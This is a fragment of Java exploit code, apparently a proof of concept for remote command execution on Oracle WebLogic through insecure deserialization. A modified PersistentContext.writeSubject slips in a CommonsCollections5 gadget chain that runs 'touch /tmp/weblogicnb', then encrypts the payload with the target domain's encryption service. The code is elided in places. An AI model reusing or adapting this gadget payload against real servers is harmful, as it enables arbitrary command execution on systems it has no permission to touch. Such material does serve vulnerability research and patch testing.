...
public class PersistentContext extends AbstractStorable {
    ...
    private void writeSubject(ObjectOutputStream var1) throws IOException {
        ...
        if (SubjectManager.getSubjectManager().isKernelIdentity(this._subject)) {
            ...
            var3.writeObject(Exp.getObject());
        }
        ...
        EncryptionService es = SerializedSystemIni.getEncryptionService("/Users/error/weblogic/domain/wls1036_domain");
        var5 = es.encryptBytes(var5);
...
class Exp{
    public static BadAttributeValueExpException getObject(){
        try{
            CommonsCollections5 commonsCollections5 = new CommonsCollections5();
            return commonsCollections5.getObject("touch /tmp/weblogicnb");
        }catch (Exception e){
            e.printStackTrace();
            return null;
        }
